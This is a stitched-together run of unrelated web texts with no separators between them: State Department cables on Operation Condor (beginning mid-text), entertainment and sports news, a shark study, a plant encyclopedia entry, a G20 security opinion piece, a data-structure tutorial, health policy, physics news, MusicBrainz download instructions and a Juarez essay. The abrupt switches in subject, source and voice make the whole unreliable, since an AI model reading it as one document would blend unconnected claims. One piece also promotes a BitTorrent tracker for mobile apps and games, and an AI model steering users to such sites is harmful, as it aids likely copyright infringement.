Kissinger instructs the ambassadors of Argentina , Chile and Uruguay to meet as soon as possible with the chief of state or the highest appropriate official of their respective countries and to convey a direct message , known in diplomatic language as a " demarche . "
The ambassadors are instructed to tell the officials the U.S. government has received information that Operation Condor goes beyond information exchange and may " include plans for the assassination of subversives , politicians and prominent figures both within the national borders of certain Southern Cone countries and abroad . "
Further , the ambassadors are to express the U.S. government 's " deep concern , " about the reports and to warn that , if true , they would " create a most serious moral and political problem . "
Document 2 - Department of State , Action Memorandum , Ambassador Harry Schlaudeman to Secretary Kissinger , " Operation Condor , " August 30 , 1976 In his memo to Kissinger dated August 30 , 1976 , Schlaudeman spelled out the U.S. position on Condor assassination plots :
" What we are trying to head off is a series of international murders that could do serious damage to the international status and reputation of the countries involved . "
Shlaudeman 's memo requests approval from Kissinger to direct U.S. ambassador to Uruguay , Ernest Siracusa , to proceed to meet with high officials in Montevideo and present the Condor demarche .
Document 3 - Department of State , Cable , " Actions Taken , " September 16 , 1976
In this cable , sent from Lusaka where Kissinger is traveling , the Secretary of State refuses to authorize sending a telegram to U.S. Ambassador to Uruguay , Ernest Siracusa , instructing him to proceed with the Condor demarche .
Kissinger than broadens his instructions to cover the delivery of the demarche in Chile , Argentina and Uruguay : " The Secretary has instructed that no further action be taken on this matter . "
These instructions effectively end the State Department initiative to warn the Condor military regimes not to proceed with international assassination operations , since the demarche has not been delivered in Chile or Argentina .
Document 4 - Department of State , Cable , " Operation Condor , " Septmber 20 , 1976 Kissinger 's Assistant Secretary of State for Inter - American Affairs received his instructions on turning off the Condor demarche on September 16th .
Three days later , while in Costa Rica , Shlaudeman receives another cable , which remains secret , from his deputy , William Luers , regarding how to proceed on the demarche .
At this point , on September 20 , Shlaudeman directs Luers , to " instruct the [ U.S. ] ambassadors to take no further action noting that there have been no reports in some weeks indicating an intention to activate the Condor scheme . "
Condor 's most infamous " scheme " comes to fruition the very next day when a car - bomb planted by agents of the Chilean secret police takes the life of former Chilean diplomat , and leading Pinochet opponent , Orlando Letelier , and his 26 - year old American colleague , Ronni Karpen Moffitt , in downtown Washington D.C. Document 5 - Briefing Memorandum , Ambassador Harry Schlaudeman to Secretary Kissinger , " Operation Condor , " October 8 , 1976 In his October 8 memo to Kissinger transmitting a CIA memorandum of conversation with Col.
Contreras , Schlaudeman argued that " the approach to Contreras seems to me to be sufficient action for the time being " because " the Chileans are the prime movers in Operation Condor . "
EXCLUSIVE :
In a whopping deal coming together quickly , Stephen King , Imagine Entertainment and Weed Road are in discussions to make a screen trilogy and TV series out of King ’s epic novel series The Dark Tower .
Akiva Goldsman will write the script , Ron Howard will direct it , and his Imagine Entertainment partner Brian Grazer will produce with Goldsman and King .
Universal is in talks to acquire a package that included the books , and the attachment of the team behind the Oscar - winning film A Beautiful Mind and The Da Vinci Code .
Both Universal –where Imagine is based — and Warner Bros — where Goldsman ’s Weed Road banner is housed — have been vying for the project .
The Dark Tower is King ’s answer to JRR Tolkien ’s The Lord of the Rings , and the author will get his own screen trilogy .
Like Tolkien , King ’s epic novel series is set in an otherworldly but familiar world , and involves a quest to save the world .
The series spanned seven novels that involved Roland Deschain , the last living member of a knightly order of gunslingers who exists in a world that has an Old West feel , but which is infused with magic .
He is on a quest to find the Dark Tower , a structure that holds the key to the nexus of all universes .
He encounters many allies and enemies along the way , as the world crumbles around him .
The book series was once developed by JJ Abrams and his Lost cohorts Damon Lindelof and Carlton Cuse , but they never cracked it .
Goldsman , who has become a prolific producer , was the catalyst for securing the rights from King , and he brought it to Howard and Grazer .
It was not immediately evident how large the transaction was , but King has often optioned his works for little or no money upfront , and reportedly he bestowed the rights on Abrams for $ 19 , a number which has significance in the novel series .
King is working on an eighth novel , one that does n’t change the ending , but deals with characters and a storyline that falls midway in the series .
CAA is working on the deal .
It was only a matter of time before another banker , lured by the prospects of riches , would get busted on allegations of stealing source code connected to a high - frequency , stock - and - commodities trading platform .
The latest arrest concerns a former Societe Generale trader who was being detained Tuesday on New York federal court charges of stealing the computer code of the Paris - based banking concern 's high - frequency trading software .
Monday 's arrest of Samarth Agrawal , 26 , came nine months after a Goldman Sachs programmer was arrested on similar charges that he , too , stole his employer 's source code for software his employer used to make sophisticated , high - speed , high - volume stock and commodities trades .
The Securities and Exchange Commission is investigating the use of these programs that many believe give their users an unfair advantage over other traders .
Nevertheless , stealing the code to these suspect programs remains illegal .
When Sergey Aleynikov , the Goldman Sachs computer programmer , was arrested in July , the authorities said the software at issue could " manipulate markets in unfair ways . "
And on Monday , Manhattan federal prosecutors wrote in Agrawal 's complaint that Societe Generale " believes that , if competing firms were to obtain the code and use its features , the financial institution 's ability to profit from trades using the code would be significantly diminished " ( .pdf ) .
According to Agrawal 's complaint , the code at issue " uses a number of sophisticated mathematical formulas , or algorithms , to make decisions about , among other things , the volume , price and timing of trades that are made by the trading system .
The trades made using the trading system typically generate millions of dollars of profits per year for the financial institution . "
In both prosecutions , the authorities said the defendants had wanted the code for their own financial benefit .
When Agrawal resigned from the Paris - based bank 's New York offices , he allegedly told his employer he wanted to move back to India and begin his own high - frequency trading fund .

WASHINGTON — The Supreme Court on Monday agreed to decide whether the father of a Marine killed in Iraq may sue protesters who picketed his son ’s funeral with signs that read “ God Hates You ” and “ Thank God for Dead Soldiers . ”
A federal appeals court dismissed the suit on First Amendment grounds and threw out a $ 5 million award against the protesters , who are members of Westboro Baptist Church in Topeka , Kan. , and maintain that God hates homosexuality and that the death of soldiers in Iraq and Afghanistan is God ’s way of punishing the United States for its tolerance of it .
The fallen Marine was Lance Cpl. Matthew A. Snyder , and his funeral was held in Westminster , Md. , in 2006 .
His father , Albert Snyder , testified at trial in 2007 that the protests continued to haunt and disturb him .
“ For the rest of my life , ” Mr. Snyder said , “ I will remember what they did to me , and it has tarnished the memory of my son ’s last hour on earth . ”

A shark ’s habitat can reduce its sensitivity to rising CO 2 levels , according to Australian scientists .
Globally , ocean acidification – linked to emissions of greenhouse gases – remains a major concern and scientists say it will harm many marine species over the next century .
Researchers from the ARC Centre of Excellence for Coral Reef Studies ( Coral CoE ) at James Cook University have found that the epaulette shark , a species that shelters within reefs and copes with low oxygen levels , is able to tolerate increased carbon dioxide in the water without any obvious physical impact .
“ As part of the study we exposed the sharks to increased CO 2 for more than two months , mirroring the levels predicted for the end of the century , ” says study co-author Dr Jodie Rummer from Coral CoE .
“ We then tested the sharks ’ respiratory system , measuring how much oxygen it needed to maintain basic function under the experimental conditions . ”
The researchers found the sharks were regulating their systems to counter the higher levels of acid in their bodies .
Importantly , Dr Rummer explains , the sharks ’ ability to cope with low oxygen levels – similar to that found in its natural habitat – was unaffected by high CO2 levels .
Study co-author , Professor Philip Munday from the Coral CoE says the sharks ’ physiological adaptations , which enables it to cope with the conditions within reefs , makes them better able to tolerate ocean acidification .
“ Species that live in shallow reef environments , where they can experience naturally high CO 2 levels on a regular basis , may have adaptations that make them more tolerant to future rises in CO 2 levels than other species . ”
Professor Munday says the next critical step is to test the sensitivity of other shark species to ocean acidification .
“ Species that live in the open ocean may be more susceptible to future acidification than those that naturally live in shallow reef environments where they already experience a variable environment . ”
Dr Rummer adds that by determining which animals are more and less susceptible to high CO 2 than others , scientists will be better able to predict the future consequences of ocean acidification on marine ecosystems .

Genus of flowering plants , known for effect on cats ( catnip ) in the mint family ( Lamiaceae )
Nepeta is a genus of flowering plants in the family Lamiaceae .
The genus name is reportedly in reference to Nepete , an ancient Etruscan city .
[ 2 ]
There are about 250 species . [ 3 ]
The genus is native to Europe , Asia , and Africa , and has also naturalized in North America . [ 4 ]
Some members of this group are known as catnip or catmint because of their effect on house cats – the nepetalactone contained in some Nepeta species binds to the olfactory receptors of cats , typically resulting in temporary euphoria . [ 5 ]
Description [ edit ]
Most of the species are herbaceous perennial plants , but some are annuals .
They have sturdy stems with opposite heart - shaped , green to gray - green leaves . [ 3 ]
Nepeta plants are usually aromatic in foliage and flowers .
The tubular flowers can be lavender , blue , white , pink , or lilac , and spotted with tiny lavender - purple dots .
The flowers are located in verticillasters grouped on spikes ; or the verticillasters are arranged in opposite cymes , racemes , or panicles – toward the tip of the stems . [ 3 ]
The calyx is tubular or campanulate , they are slightly curved or straight , and the limbs are often 2 - lipped with five teeth .
The lower lip is larger , with 3 - lobes , and the middle lobe is the largest .
The flowers have 4 hairless stamens that are nearly parallel , and they ascend under the upper lip of the corolla .
Two stamen are longer and stamens of pistillate flowers are rudimentary .
The style protrudes outside of the mouth of the flowers . [ 3 ]
The fruits are nutlets , which are oblong - ovoid , ellipsoid , ovoid , or obovoid in shape .
The surfaces of the nutlets can be slightly ribbed , smooth or warty . [ 3 ]
Selected species [ edit ]
Some species formerly classified as Nepeta are now in the genera Dracocephalum , Glechoma , and Calamintha .
Species include : [ 6 ]
Gallery [ edit ]
Uses [ edit ]
Cultivation [ edit ]
Some Nepeta species are cultivated as ornamental plants .
They can be drought tolerant – water conserving , often deer repellent , with long bloom periods from late spring to autumn .
Some species also have repellent properties to insect pests , including aphids and squash bugs , when planted in a garden . [ 2 ]
Nepeta species are used as food plants by the larvae of some Lepidoptera ( butterfly and moth ) species including Coleophora albitarsella , and as nectar sources for pollinators , such as honey bees and hummingbirds .

The G20 summit will be held on June 26 - 27 at the Metro Toronto Convention Centre preceded by the G8 summit which will take place in Huntsville , Ontario .
The secretive meetings will be attended by world leaders , finance ministers , central bank governors , along with thousands of other delegates .
It will be the largest security event in Canadian history exceeding the Vancouver Winter Olympics .
Downtown Toronto will be turned into a security fortress with fences , barricades , checkpoints and street closures thus greatly affecting local residents .
While the G8/G20 summits will attract their share of peaceful protesters , other more radical and fringe elements may try to capitalize on the event .
Agent provocateurs might also be used whose actions could then justify a police crackdown and as a means to demonize all demonstrators .
The G20 summit will deepen police state measures , as well as further integrate local , provincial , federal law enforcement agencies and the military .
Canada ’s Prime Minister Stephen Harper speaks during the G8 foreign ministers ’ meeting in Gatineau , Quebec , on March 30 , 2010 .
Security for the upcoming G20 summit will be the responsibility of the Integrated Security Unit , “ comprised of the RCMP , the OPP ( in the G8 context ) , the Canadian Forces , Toronto Police Service , Peel Regional Police and other law enforcement and security experts who will work collaboratively . ”
Ed Boltuc , a member of the G20 planning team for the Toronto Police Service stated , “ The Olympics that you saw recently in Vancouver was actually the largest security event ever to take place here in Canada .
The G20/G8 surpasses that completely . ”
He went on to say , “ There ’s going to be a massive — absolutely massive — presence of police and security on the ground like you ’ve never seen before . ”
The Globe and Mail reported that as many as 10,000 uniformed officers , along with a 1,000 private security guards will be deployed together with an unspecified number of Canadian soldiers .
Foreign dignitaries attending the meetings will also have their own security detail .
The federal government security costs are expected to top $ 179 million .
As part of the operation , a two fenced security perimeter will encircle the Metro Convention Centre and nearby hotels where delegates will be staying .
The RCMP are entrusted with protecting the inner security zone which will be controlled by a 3 - metre - high unscalable fence , as well as five levels of security screening .
Toronto police will be in charge of the outer zone and will deal with any protests beyond the perimeter .
Canadian Forces responsibilities involve , “ large - scale operational planning , land and air surveillance , underwater safety and security for the venues and some logistic and ceremonial functions .
Support also includes drawing on the CF ’s ongoing partnership in the North American Aerospace Defence Command ( NORAD ) . ”
Heightened security will begin two weeks before the summit .
In order to gain access to the outer security zone , residents and workers will need to be registered or accredited .
Designated free speech zones will also be put in place for demonstrators .
Toronto Police have announced that they will be using an old movie studio as a temporary jail to house unruly protesters during the event .
A d v e r t i s e m e n t
{openx:49}
The G8/G20 summits have become a platform for protests on issues such as social justice , anti-globalization and the environment .
A government website section entitled Information for Demonstrators points out that freedoms of opinion , expression and peaceful assembly guaranteed under the Canadian Charter of Rights and Freedoms are not limitless .
The Criminal Code of Canada contains provisions that limit certain activities including blocking or obstructing a highway , causing a disturbance , mischief , riots , unlawful assembly , breach of the peace and others .
Some of these laws could be subjectively enforced and just as government grants you rights , they can just as easily take them away .
Most protesters will probably remain peaceful , but some groups and individuals might have different ideas .
In the past , police have been caught using provocateurs at rallies and activists need to be mindful of those who may attempt to infiltrate their ranks and engage in unlawful behaviour .
Council of Canadians spokesman Dylan Penner wants the government to promise it will not use agents provocateurs like it did at North American Leaders Summit in Montebello , Quebec , back in 2007 .
In advance of G20 summit , some Toronto activists have been subjected to harassment and intimidation by police .
Similar tactics were also employed in Vancouver before the Olympics .
People in Toronto are already getting a taste of what to expect during the G20 summit .
A recent training exercise simulated a hostage taking in the concourse level of Commerce Court , in the downtown core of the city .
The operation was comprised of Toronto Police Emergency Task Force , along with private security personnel .
The joint exercise was designed to train police and security guards on how to communicate through a shared radio system .
During the G20 summit , private security will play an important role in crowd control and emergency response .
This is part of the continued merging of the public and private security sectors .
Another training exercise involved two military helicopters flying around the Metro Toronto Convention Centre and then landing in front of the CN Tower .
This was to test the capability of the landing area and practice transporting delegates to the venues site .
These various security drills are intended to check coordinated responses and ultimately to confirm readiness for the summit .
They are also used to further acclimate increased police and military presence .
More than anything , it is protests and the threat of terrorism which are used to justify these huge security operations .
The deployment of the military alongside police is increasing with their roles seemingly interchangeable .
Police tactics and training have become more militarized .
New weapons and technology first developed for the military are often being incorporated into police departments .
At last year ’s G20 summit in Pittsburgh , the LRAD which is capable of emitting painfully loud blasts of sound was turned against protesters .
This illustrates a more aggressive approach in trying to control public dissent .
Events such as the G20 have become a testing ground for new police state measures and a trial run for a military style occupation .
In June , downtown Toronto will essentially be on lockdown with rights and liberties severely restricted .

You 're probably used to sending emails to friends and colleagues at any number of different addresses and you do n't have to think twice about which email service they use .
The same should be true for collaboration tools .
Novell Pulse , an upcoming enterprise - focused collaboration tool , is built using the Google Wave Federation Protocol , which means Novell Pulse users will be able to collaborate not only with each other , but also with anyone using another wave service , such as Google Wave .
At the closing keynote of Novell 's BrainShare conference today , we showed a demo of how Novell Pulse and Google Wave will work together .
For those of you who were n't at the event , here is a screen capture of the two products working together [ the keynote video will be available early next week ] :
This boils down to enabling user choice .
We 're working on the Google Wave Federation Protocol based on open source principles with other companies including Novell because we want users to have a choice of different wave providers .
The protocol is flexible enough that different products can include different features , but still work together , letting wave providers make independent design decisions and even build for a specific group of users .
For example , Novell Pulse includes a feature for authenticating against enterprise account management systems , and Google Wave has per-wave participant suggestion built in .
We look forward to seeing more products support the Google Wave Federation Protocol .
If you 're interested in trying Google Wave , you can request an account , and for more details on Novell Pulse 's use of the Google Wave Federation Protocol , check out the post on the developer blog .

In the beginning , there was a binary tree :
struct ctree { // c for children int val ; struct ctree * left ; struct ctree * right ; }
The flow of pointers ran naturally from the root of the tree to the leaves , and it was easy as blueberry pie to walk to the children of a node .
Unfortunately , given a node , there was no good way to find out its parent !
If you only needed efficient parent access , though , you could just use a single pointer in the other direction :
struct ptree { // p for parent int val ; struct ptree * parent ; }
The flow of pointers then ran from the leaves of the tree to the root :
And of course , put together , you could have the best of both worlds :
struct btree { int val ; struct btree * parent ; struct btree * left ; struct btree * right ; }
Our data structure had become circular , but as a result we had extremely efficient ways to walk up and down the tree , as well as insert , delete and move nodes , simply by mutating the relevant pointers on our node , its children and its parent .
Trouble in paradise .
Pointer tricks are fine and good for the mutable story , but we want immutable nodes .
We want nodes that wo n't change under our nose because someone else decided to muck around the pointer .
In the case of ctree , we can use a standard practice called path copying , where we only need to change the nodes in the path to the node that changed .
In fact , path copying is just a specific manifestation of the rule of immutable updates : if you replace ( i.e. update ) something , you have to replace anything that points to it , recursively .
In a ptree , we 'd need to know the subtree of the updated node and change all of them .
But btree fails pretty spectacularly :
Our web of pointers has meant we need to replace every single node in the tree !
The extra circular pointers work to our detriment when looking for a persistent update .
What we'd like to do is somehow combine the ptree and the ctree more intelligently , so we do n't end up with a boat of extra pointers , but we still can find the children and the parent of a node .
Here , we make the critical simplifying assumption : we only care about efficient access of parents and children as well as updates of a single node .
This is not actually a big deal in a world of immutable data structures : the only reason to have efficient updates on distinct nodes is to have a modification made by one code segment show up in another , and the point of immutability is to stop that spooky action at a distance .
So , on a single node , we want fast access to the parent and children and fast updates .
Fast access means we need pointers going away from this node , fast updates means we need to eliminate pointers going into this node .
Easy !
Just flip some pointers ( shown in red . )
Congratulations , the data structure you see here is what we call a zipper !
The only task left for us now is to figure out how we might actually encode this in a struct definition .
In the process , we 'll assign some names to the various features inside this diagram .
Let 's consider a slightly more complicated example :
We 've introduced a few more notational conveniences : triangles represent the tree attached to a given node when we do n't care about any of its subnodes .
The squares are the values attached to any given node ( we 've shown them explicitly because the distinction between the node and its data is important . )
The red node is the node we want to focus around , and we 've already gone and flipped the necessary pointers ( in red ) to make everything else accessible .
When we 're at this location , we can either traverse the tree , or go up the red arrow pointed away from the green node ; we 'll call the structure pointed to by this arrow a context .
The combination of a tree and a context gives us a location in the zipper .
struct loc { struct ctree * tree ; struct context * context ; }
The context , much like the tree , is a recursive data - structure .
In the diagram below , it is precisely the node shaded in black .
It 's not a normal node , though , since it 's missing one of its child pointers , and may contain a pointer to its own parent .
The particular one that this location contains is a " right context " , that is , the arrow leading to the context points to the right ( shown in black in the following diagram ) .
As you can see , for our tree structure , a context contains another context , a tree , and a value .
Similarly , a " left context " corresponds to an arrow pointing to the left .
It contains the same components , although it may not be quite obvious from the diagram here : where 's the recursive subcontext ?
Well , since we 're at the top of the tree , instead we have a " top context " , which does n't contain any values .
It 's the moral equivalent of Nothing .
enum context_type {LEFT , RIGHT , TOP} struct context { enum context_type type ; // below only filled for LEFT and RIGHT int val ; struct context * context ; struct ctree * tree ; }
And there we have it !
All the pieces you need to make a zipper :
> data Tree a = Nil | Node a ( Tree a ) ( Tree a ) > data Loc a = Loc ( Tree a ) ( Context a ) > data Context a = Top > | Left a ( Tree a ) ( Context a ) > | Right a ( Tree a ) ( Context a )
Exercises :
Write functions to move up , down - left and down - right our definition of Tree .
If we had the alternative tree definition data Tree a = Leaf a | Branch Tree a ) ( Tree a ) , how would our context definition change ?
Write the data and context types for a linked list .
Further reading :
The original crystallization of this pattern can be found in Huet 's paper ( PDF ) , and two canonical sources of introductory material are at Wikibooks and Haskell Wiki .
From there , there is a fascinating discussion about how the differentiation of a type results in a zipper !
See Conor 's paper ( PDF ) , the Wikibooks article , and also Edward Kmett 's post on using generating functions to introduce more exotic datatypes to the discussion .
BitTorrent trackers that focus solely on mobile content are a rare find in the BitTorrent community .
SyncTheBits , PYM ( down ) , PMTorrents , PodTropolis , JAF are some of the leading trackers in this niche but we really have n’t seen any new mobile oriented trackers being launched in the recent past .
This is quite surprising , given the huge popularity gained by iPhone , Windows Mobile , Java , Symbian and other mobile platforms that are in widespread use today .
Anyways Mobile.us is a new tracker that aims to break this curse .
It ’s the latest project from the experienced crew behind XtremeZone and the site has already gotten off to a flying start with over 5 k members recruited in less than a month since launch .
Mobile.us publicly launched on the 17th of March , as the latest offering in XtremeZone family of BitTorrent trackers .
In other words , Mobile has two other siblings namely XtremeZone ( signups open ) , a leading Romanian General tracker and Xtremepron , an adult torrent tracker .
Since the public launch Mobile.us has managed to recruit over 5500 members – I ’m sure a large portion of this user base are members who heard the news from XtremeZone .ro – having a big brother in the BT community has its advantages .
There ’s no secret as to what ’s indexed at Mobile .us – from iPhone apps to operator logos this site has a wide range of games , software and themes designed for a number of different mobile platforms including Android , Blackberry , iPhone , Java , Symbian , Palm and several others .
But that ’s not all , this tracker even indexes mobile optimized movies – these are specially re-encoded ( say for example into 3 GP format ) media which can easily be played back on mobile devices , without having to install additional codecs or players .
If you have any more questions on content on Mobile.us , the following screenshot should answer most of them :
While a promising tracker , Mobile.us has been plagued by downtime issues .
In fact , this is the main reason why it was not featured on this blog sooner – the site was offline more often than it was online .
Thankfully , these issues seem to have resolved by now – and let ’s hope the site would stay up for a long time to come .
Signups for mobile.us are currently open .
Those who are seeking a new Mobile oriented private tracker would want to check this site out .

She secreted the bottles into the store 's bathroom where she quaffed the seasoned wine -- cooking wine contains added salt and other spices , police said .

As insurers fearful of health care reform announce massive pre-emptive rate hikes the Obama administration proposed today to give the government the power to block the increases .
The plan was unveiled as the administration used the Internet to roll out comprehensive legislation to overhaul the nation ’s health care system .
The president ’s plan attempts to bridge the difference between House and Senate bills .
Like the Senate and House bills , it ends insurers ’ ability to deny coverage to those with pre-existing conditions , it sets up more regulations on the private insurance market , it establishes insurance exchanges where consumers can compare prices and benefit packages , it defers the tax on so - called “ Cadillac ” plans for all workers until 2018 , and provides federal subsidies to help people afford insurance .
It does not include a public option .
By adding the proposal to give the government power to block rate hikes to the plans adopted in Congress Obama is riding national outrage over recent increases of up to 40 percent by profiteering health insurance companies .
The White House announcement today came just three days before a bi-partisan health care summit called by the president for Thursday .
The Obama plan would require the Secretary of Health and Human Services , working with state regulators , to conduct an annual review of rate increases .
If the increases are deemed unjustified , the secretary or the state could block the increase , order the company to adjust it or even issue a rebate to customers for rate increases they have already paid .
The latest moves by the administration left GOP leaders in the politically uncomfortable position of having to defend the right of insurance companies to jack up their rates at will .
The first Republican to take the bait was Kevin Smith , a spokesman for House Minority Leader John A. Boehner , R - Ohio .
“ At first glance , this seems to be an admission from the Obama administration that their massive government takeover of health care will , despite their promises , increase health care premiums for millions of Americans , ” he said .
Not one Republican lawmaker has challenged increases now being put through by insurers .
The president , in his most recent radio address , slammed Blue Cross in California for its 39 percent rate hike .
Republicans across the board are fearful that Thursday ’s health care summit will succeed in moving legislation forward and that it will expose their obstructionist role .
Michael Steele , the GOP chairman , has already attempted to portray the roll - out of the president ’s plan as a deal breaker for the bi-partisan summit .
“ It is baldfaced hypocrisy to continue hammering out the latest partisan backroom deal while preparing for a ‘ bipartisan ’ summit , ” he said .
The White House ’s plan amounts to a basic outline of the final bill which almost all reliable sources now say Democrats will try to pass using reconciliation , a procedural tactic that only requires Democratic votes in the Senate to pass it .
Labor and its allies note that Republicans want Democrats to give up on health care because it will “ prove ” the majority party is unable to govern .
They say Republicans want Thursday ’s health care summit to fail because if it works the GOP , left without a talking point , will be standing out in the open exposed as the party of “ no . ”
The White House has cleverly urged Republicans to post their bills online .
Republican health care proposals , of course , are either non-existent or where there are proposals they fall far short of the Democrats ’ aim to insure 31 million additional people .
The House Republican proposal , for example , would only add 3 million people to the rolls .
Republicans have attacked the White House for having included a “ carve out for labor ” in its plan .
Union leaders won agreement from the president that provisions in the Senate bill that would tax so - called “ Cadillac ” insurance plans some workers get from employers would be put off and that workers in some high risk jobs would not have these plans taxed at all .
A report issued by the California Endowment and the Institute for America ’s Future last week shows that claims of favoritism toward union workers are false .
The report says that the revisions negotiated by the labor movement would reduce the tax ’s revenue by $ 41 billion , of which 71 percent would accrue to nonunion workers .

( PhysOrg.com ) --
An experiment led by a University of Alberta researcher , at the Large Hadron Collider ( LHC ) at CERN , could dramatically change our concepts of basic physics , revolutionize our understanding of the Universe and could eventually lead to technologies in future generations that right now only exist in science fiction .
U of A physics professor James Pinfold is leading an international team of physicists who will use ultra high energy proton collisions .
The protons will move at very near the speed of light , in search for a hypothetical particle , called the magnetic monopole .
An introduction to the MoEDAL detector .
The magnetic monopole is a theoretical particle of matter .
" Several important theories of physics are built on the belief that monopoles exist and it would be a great scientific coup to prove that , " said Pinfold .
If successful , Pinfold says , physics textbooks from university level right down to high school will have to be revised .
" Our conventional understanding of magnets tells us they have a north pole and a south pole , " said Pinfold .
" A magnetic monopole has only one pole and that will change our understanding and the potential of electromagnetism , " the force that binds particles of matter together .
" Electromagnet force is the reason that , when I sit down on a chair , I do n't fall through it . "
Pinfold says the discovery of electronic monopoles will open up a whole new future for materials and technology if scientists can produce large numbers of them .
" Monopoles could make materials strong enough to withstand a nuclear explosion and could also enable magnetic levitation . "
Conventional understanding of magnets is that they must have north and south poles .
In 1930 it was shown that a sub atomic particle with just a single magnetic pole could exist .
Several modern theories of physics are built on the theoretical existence of magnetic monopoles .
Last year , researchers in France and Germany reported the observation of certain states of spin ice , a kind of crystalline material with essentially the same atomic arrangements as water ice that would create monopole - like particles .
But Pinfold warns , " these ' quasi - monopoles ' should not be confused with the real thing being sought by the U of A led collaboration at CERN . "
The U of A - led experiment is already underway at the LHC and Pinfold says he hopes to find evidence of magnetic monopoles early in 2011 .
" It 's quite an honour to be conducting this experiment , " said Pinfold .
" We can't wait till we get our hands on the data from the LHC . "
At CERN , on the Swiss , French border , Pinfold 's team will use the LHC , a particle accelerator 27 kilometres in circumference , to search for magnetic monopoles in the shrapnel like debris produced by colliding protons .
The proton collisions will create unprecedented energy , 14 TeV .
The tiny fireballs created in the impact will duplicate the energy produced just after the Big Bang , the event that created the universe .

Relatively under the radar compared to the news of the continuing coaching search , or the seismic event of the Montreal Canadiens dropping the Washington Capitals out of the Stanley Cup Playoffs last night , the Blue Jackets announced this morning that they 've inked a pair of entry level deals for the 2010 - 2011 season .
One , the signing of 2008 second round pick Cody Goloubef , was expected .
After playing for three years at Wisconsin and reaching the NCAA championship game this Spring , the smooth skating d-man had appeared to reach the peak of his NCAA career , and the Jackets agreed , inking him to a 3 year entry level deal that will likely see him refining his craft in Springfield , though I would n't be surprised to see him as an injury call up , similar to Grant Clitsome this year .
A more surprising signing was Gustaf Wesslau of the Swedish Elitserien club Djurgardens IF .
The Swedish goaltender is 25 years old , weighing in at an impressive 6 ' 4 " , 198 lbs .
Wesslau lead Djurgardens to the Elitserien championship game before falling to champion club HV71 in overtime of game 7 .
In 32 regular season appearances he posted a 2.29 GAA , 91.7 % save percentage , and two shutouts .
If he can adjust to the smaller ice and higher pace of the North American game , he could be very similar to Toronto 's Jonas Gustavsson .
Wesslau was signed to a one year , two way entry level contract .
All signs point to him starting the year in Springfield , but given the CBJ are starting the season in Sweden , it 's certainly possible that the club might bring him along for use in their exhibition games if he has a good preseason camp .
This signing also means a shakeup in Columbus ' goalie prospects - with both Dan LaCosta and Kevin Lalande reaching RFA status this summer , it seems that only one will be retained by the parent club , and one has to think that despite his brief hero status last season when he was able to shut out the San Jose Sharks during an emergency callup , Dan LaCosta will be the odd man out .
Since Lalande was acquired from Calgary at the 2009 trade deadline , the Kingston , ON native has taken over the starting role in Syracuse and LaCosta 's confidence appears to have suffered as a result , posting only 7 wins and a 3.96 GAA in 26 starts .
It 's likely that GM Scott Howson will allow LaCosta to seek a fresh start with another club while using Wesslau to push Lalande ahead in his development in the AHL .

The data dumps are made available in a format that can be loaded into a local instance of PostgreSQL using a local instance of MusicBrainz Server .
See MusicBrainz Server Setup for how to do it .
Instructions and scripts are provided to download the data .
If you are interested in keeping the data in sync with MusicBrainz using our live data feed , make sure to enable replication .
Alternatively , if you are not interested in having a local MusicBrainz website and web service , you can use mbdata that includes replication without the rest of MusicBrainz Server .

The data dumps are available for download via http , ftp or rsync at following places :
File Descriptions
Each data dump snapshot provided over FTP includes a number of different files .
Depending on your use cases , you may or may not require all of them .
Here 's a rundown of what they contain :
The Basics
If you 're only looking for music metadata , you can start here with the basics .
These files should help you get everything you need to replicate the core catalog .
If you 're looking for more advanced , or more analytical data , you should still have a look at these basics , but make sure to also see the Advanced section below .
ASC files
All of the `.asc` files contain the PGP signatures for their respective files .
You can use these to verify the PGP signatures of the files after you 've downloaded .
In order to verify the downloads , you must first fetch the MusicBrainz public key :
$ gpg -- recv-keys C777580 F gpg : requesting key C777580 F from hkp server keys.gnupg.net gpg : /home/kevin/.gnupg/trustdb.gpg : trustdb created gpg : key C777580 F : public key " MusicBrainz ( MusicBrainz data dump signing key ) < support@musicbrainz.org > " imported gpg : no ultimately trusted keys found gpg :
Total number processed : 1 gpg : imported : 1 ( RSA : 1 ) `
Now you can verify the GPG signatures .
For example , if you download the SHA256SUMS files :
$ wget http://ftp.musicbrainz.org/pub/musicbrainz/data/fullexport/20150718-003933/SHA256SUMS
... $ wget http://ftp.musicbrainz.org/pub/musicbrainz/data/fullexport/20150718-003933/SHA256SUMS.asc ... # now you can run : $ gpg --verify SHA256SUMS.asc SHA256SUMS gpg : Signature made Sat 18 Jul 2015 03:10:45 AM
UTC using RSA key ID C777580 F gpg : Good signature from " MusicBrainz ( MusicBrainz data dump signing key ) < support@musicbrainz.org > " gpg : WARNING :

Note :
If you do n't use `gpg` very frequently , and have n't marked the key as trusted ( or marked any other key as trusted ) , you 'll see the above warning that the key is not certified .
It does n't mean that the signature is invalid , just that `gpg` wo n't be convinced that the source of the key you received is authentic until you tell it that you think it is .
MD5SUM and SHA25SUM
These files contain the checksums for the hosted files .
You can run `md5sum` and `sha256sum` on the downloaded .tar. bz2 files to validate the checksums :
$ wget http://ftp.musicbrainz.org/pub/musicbrainz/data/fullexport/20150718-003933/mbdump-stats.tar.bz2 $ sha256sum mbdump-stats.tar.bz2 5ad5de5c6804c6c937729382f7a0db50f46dc9ae0a4a143e7720fb1d4bbbfeba mbdump-stats.tar.bz2

Editor 's note : Charles Bowden is the author of 11 books , including " Down by the River : Drugs , Money , Murder and Family " ; " Juárez : The Laboratory of our Future " ; " Some of the Dead Are Still Breathing " and his latest , " Murder City , " about Ciudad Juarez .
He is a contributing editor of Esquire and writes for newspapers and magazines such as Harper 's and The New York Times Book Review .
Tucson , Arizona ( CNN ) --
Last week during the day , some kids in Ciudad Juarez , Mexico , were playing soccer in a park when a car slowed down , guys got out and executed a 13 - year - old boy .
And then they drove away , unmolested in a city with 11,000 army and police officers .
The Mexican government repeatedly states that 90 percent of the deaths in the current drug war are of people who are dirty ; that is , criminals involved in the drug business .
The killings of reporters and of innocent women , men and children continually belie that statement .
The child was not a cartel member in disguise .
Nor were the 15 high school kids killed at a party in a small house in a poor barrio .
Their parents had made them hold the celebration of a sports victory at home because it was too dangerous to be out in the city .
I went to Juarez in June of 1995 and never seem to escape the pull of the place .
The city then was controlled by Amado Carrillo Fuentes , then the head of the Juarez cartel .
Drug Enforcement
Agency intelligence told me he was raking in $ 250 million a week .
American factories were erupting out of the ground in the wake of the passage of NAFTA .
Huge districts of shacks made out of stolen pallets and cardboard boxes were growing faster than the city could map .
These shacks were filled with people working full time in those American - owned factories .
